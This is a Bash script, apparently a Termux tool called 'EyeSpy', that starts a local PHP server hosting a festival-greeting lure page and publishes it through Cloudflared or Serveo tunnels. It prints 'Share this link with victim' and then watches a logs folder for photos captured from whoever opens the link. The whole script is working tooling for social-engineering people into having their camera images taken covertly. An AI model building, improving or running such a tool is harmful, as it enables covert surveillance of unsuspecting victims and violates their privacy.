#!/bin/bash

# Colors
green='\e[92m'
red='\e[91m'
yellow='\e[93m'
cyan='\e[96m'
reset='\e[0m'

# Auto-install required packages
echo -e "${yellow}[+] Checking & Installing required packages...${reset}"
pkgs=(php openssh wget figlet lolcat inotifywait)
for pkg in "${pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${cyan}Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# Install cloudflared if not installed
if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${cyan}Installing cloudflared...${reset}"
    pkg install cloudflared -y >/dev/null 2>&1
fi

# Banner
clear
echo -e "${cyan}"
figlet -f slant "EyeSpy" | lolcat
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${green}  Created by: Alok Thakur${reset}"
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${green}  Subscribe: Firewall Breaker YouTube${reset}"
echo -e "${cyan}--------------------------------------------${reset}"
echo ""

# Tunnel Menu
echo -e "${yellow}[+] Choose Tunnel Option:${reset}"
echo -e "${green}1) Localhost (default)${reset}"
echo -e "${cyan}2) Cloudflared${reset}"
echo -e "${red}3) Serveo.net (SSH Tunnel)${reset}"
echo -ne "${yellow}Enter your choice [1-3]: ${reset}"
read opt
opt=${opt:-1}

# Festival Name
echo -ne "${yellow}\nEnter Festival Name: ${reset}"
read fest
fest_slug=$(echo "$fest" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')

# Update festival name in camera.html
sed -i "s|⭐ Happy .* ⭐|⭐ Happy $(echo "$fest" | sed 's/[&/\]/\\&/g') ⭐|g" camera.html


# Start PHP Server
echo -e "${yellow}\n[+] Starting PHP server on localhost:8080${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 3

# Tunnel Setup
link=""
if [[ $opt == 2 ]]; then
    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
    killall cloudflared >/dev/null 2>&1
    rm -f .clflog
    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
    sleep 5

    echo -e "${yellow}[+] Fetching Cloudflared link...${reset}"
    for i in {1..15}; do
        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
        if [[ $link != "" ]]; then
            break
        fi
        sleep 1
    done

elif [[ $opt == 3 ]]; then
    echo -e "${yellow}[+] Starting Serveo.net (SSH Tunnel)...${reset}"
    killall ssh >/dev/null 2>&1
    rm -f .servolog
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
    sleep 7

    echo -e "${yellow}[+] Fetching public link from Serveo...${reset}"
    for i in {1..15}; do
        link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
        if [[ $link != "" ]]; then
            break
        fi
        sleep 1
    done

    if [[ $link == "" ]]; then
        echo -e "${red}[-] Serveo tunnel failed. Try again later.${reset}"
        exit 1
    fi
else
    link="http://localhost:8080"
fi

# Show Link
echo -e "\n${cyan}[+] Share this link with victim:${reset} ${green}$link${reset}"

# Monitor Captured Images (Suppress inotifywait output)
echo -e "\n${yellow}[+] Waiting for target to open link...${reset}"
inotifywait -m logs -e create --format '%f' 2>/dev/null |
while read file; do
    echo -e "${green}[+] Photo Captured:${reset} logs/$file"
done
